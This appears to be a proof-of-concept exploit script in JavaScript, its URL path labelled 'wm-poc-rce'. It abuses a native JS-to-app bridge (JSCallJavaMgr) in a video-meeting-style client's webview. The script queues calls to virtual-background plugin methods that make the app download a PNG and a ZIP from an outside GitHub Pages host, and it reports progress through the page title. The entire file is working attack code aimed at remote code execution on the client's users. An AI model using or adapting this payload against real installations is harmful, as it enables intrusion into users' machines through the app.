(function(){
  document.title='P74PAY:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P74PCB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,72);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var q=[
    ['C0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{}],
    ['C1','VirtualBackgroundWebPlugin','DownloadFile',{url:png,over_write:true}],
    ['C2','VirtualBackgroundWebPlugin','HandleSetVirtualBackground',{url:png,over_write:true,backgroundType:'picture'}],
    ['K1','VirtualBackgroundWebPlugin','CheckVBKMaxNum',{}],
    ['K2','VirtualBackgroundWebPlugin','CheckVBKIsExist',{url:png}],
    ['C6','VirtualBackgroundWebPlugin','HandleSetVirtualBackgroundByType',{url:png,backgroundType:'picture'}],
    ['C5','VirtualBackgroundWebPlugin','DownloadFile',{url:zip,over_write:true}],
    ['S1','VirtualBackgroundWebPlugin','HandleOpenVirtualBackgroundSetting',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P74PAY-DONE';return}
    var x=q[i++];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n,4000);
  }
  setTimeout(n, 3000);
})();
